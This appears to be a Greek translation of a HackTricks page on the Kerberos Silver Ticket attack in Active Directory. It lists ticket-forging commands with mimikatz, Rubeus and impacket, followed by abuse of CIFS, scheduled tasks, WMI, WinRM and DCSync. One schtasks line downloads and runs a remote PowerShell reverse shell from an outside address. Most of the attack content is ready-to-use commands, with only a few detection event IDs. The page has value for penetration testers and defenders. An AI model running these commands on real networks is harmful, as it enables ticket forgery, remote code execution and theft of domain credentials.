# Ασημένιο Εισιτήριο

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Εάν ενδιαφέρεστε για μια **καριέρα στο χάκινγκ** και θέλετε να χακάρετε το αχάκατο - **προσλαμβάνουμε!** (_απαιτείται άπταιστη γραπτή και προφορική γνώση της πολωνικής γλώσσας_).

{% embed url="https://www.stmcyber.com/careers" %}

## Ασημένιο εισιτήριο

Η επίθεση **Ασημένιο Εισιτήριο** περιλαμβάνει την εκμετάλλευση εισιτηρίων υπηρεσιών σε περιβάλλοντα Active Directory (AD). Αυτή η μέθοδος βασίζεται στην **απόκτηση του NTLM hash ενός λογαριασμού υπηρεσίας**, όπως ενός λογαριασμού υπολογιστή, για να πλαστογραφήσει ένα εισιτήριο Ticket Granting Service (TGS). Με αυτό το πλαστογραφημένο εισιτήριο, ένας επιτιθέμενος μπορεί να έχει πρόσβαση σε συγκεκριμένες υπηρεσίες στο δίκτυο, **προσωποποιώντας οποιονδήποτε χρήστη**, συνήθως με στόχο την απόκτηση διαχειριστικών δικαιωμάτων. Επισημαίνεται ότι η χρήση κλειδιών AES για την πλαστογράφηση εισιτηρίων είναι πιο ασφαλής και λιγότερο ανιχνεύσιμη.

Για τη δημιουργία εισιτηρίων, χρησιμοποιούνται διάφορα εργαλεία ανάλογα με το λειτουργικό σύστημα:

### Σε Linux
```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Σε Windows
```bash
# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
Η υπηρεσία CIFS είναι ένα συνηθισμένο στόχος για την πρόσβαση στο σύστημα αρχείων του θύματος, αλλά και άλλες υπηρεσίες όπως οι HOST και RPCSS μπορούν να εκμεταλλευτούν για εργασίες και ερωτήματα WMI.

## Διαθέσιμες Υπηρεσίες

| Τύπος Υπηρεσίας                            | Εισιτήρια Silver για την Υπηρεσία                                             |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| Απομακρυσμένη Εκτέλεση PowerShell         | <p>HOST</p><p>HTTP</p><p>Ανάλογα με το Λειτουργικό Σύστημα επίσης:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>Σε ορισμένες περιπτώσεις μπορείτε απλά να ζητήσετε: WINRM</p> |
| Προγραμματισμένες Εργασίες                 | HOST                                                                       |
| Κοινόχρηστο Αρχείο Windows, επίσης psexec | CIFS                                                                       |
| Λειτουργίες LDAP, περιλαμβάνει DCSync      | LDAP                                                                       |
| Εργαλεία Απομακρυσμένης Διαχείρισης Διακομιστή Windows | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                             | krbtgt                                                                     |

Χρησιμοποιώντας το **Rubeus** μπορείτε να ζητήσετε **όλα** αυτά τα εισιτήρια χρησιμοποιώντας την παράμετρο:

* `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Αριθμοί Συμβάντων για Silver εισιτήρια

* 4624: Είσοδος Λογαριασμού
* 4634: Έξοδος Λογαριασμού
* 4672: Είσοδος Διαχειριστή

## Κατάχρηση Υπηρεσιών εισιτηρίων

Στα παρακάτω παραδείγματα, ας υποθέσουμε ότι το εισιτήριο ανακτήθηκε προσωποποιώντας τον λογαριασμό του διαχειριστή.

### CIFS

Με αυτό το εισιτήριο θα μπορείτε να έχετε πρόσβαση στον φάκελο `C$` και `ADMIN$` μέσω **SMB** (αν είναι προσβάσιμοι) και να αντιγράψετε αρχεία σε μέρος του απομακρυσμένου συστήματος αρχείων απλά κάνοντας κάτι σαν:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
Θα μπορείτε επίσης να αποκτήσετε ένα κέλυφος μέσα στον υπολογιστή ή να εκτελέσετε αυθαίρετες εντολές χρησιμοποιώντας το **psexec**:

{% content-ref url="../ntlm/psexec-and-winexec.md" %}
[psexec-and-winexec.md](../ntlm/psexec-and-winexec.md)
{% endcontent-ref %}

### ΥΠΟΛΟΓΙΣΤΗΣ

Με αυτήν την άδεια μπορείτε να δημιουργήσετε προγραμματισμένες εργασίες σε απομακρυσμένους υπολογιστές και να εκτελέσετε αυθαίρετες εντολές:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

Με αυτά τα εισιτήρια μπορείτε να **εκτελέσετε WMI στο σύστημα θύματος**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Βρείτε περισσότερες πληροφορίες σχετικά με το wmiexec στην ακόλουθη σελίδα:

{% content-ref url="../ntlm/wmicexec.md" %}
[wmicexec.md](../ntlm/wmicexec.md)
{% endcontent-ref %}

### HOST + WSMAN (WINRM)

Με την πρόσβαση winrm σε έναν υπολογιστή, μπορείτε να έχετε πρόσβαση σε αυτόν και ακόμα να λάβετε ένα PowerShell:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Ελέγξτε την ακόλουθη σελίδα για να μάθετε **περισσότερους τρόπους σύνδεσης με έναν απομακρυσμένο υπολογιστή χρησιμοποιώντας το winrm**:

{% content-ref url="../ntlm/winrm.md" %}
[winrm.md](../ntlm/winrm.md)
{% endcontent-ref %}

{% hint style="warning" %}
Σημειώστε ότι το **winrm πρέπει να είναι ενεργό και να ακούει** στον απομακρυσμένο υπολογιστή για να έχετε πρόσβαση.
{% endhint %}

### LDAP

Με αυτό το προνόμιο μπορείτε να αντλήσετε τη βάση δεδομένων του DC χρησιμοποιώντας το **DCSync**:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**Μάθε περισσότερα για το DCSync** στην ακόλουθη σελίδα:

## Αναφορές
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

{% content-ref url="dcsync.md" %}
[dcsync.md](dcsync.md)
{% endcontent-ref %}

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Εάν ενδιαφέρεστε για μια **καριέρα στο hacking** και θέλετε να χακεύετε το αχακέυτο - **προσλαμβάνουμε!** (_απαιτείται άριστη γνώση γραπτού και προφορικού Πολωνικού_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>Μάθε το hacking στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΠΑΚΕΤΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα hacking tricks σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
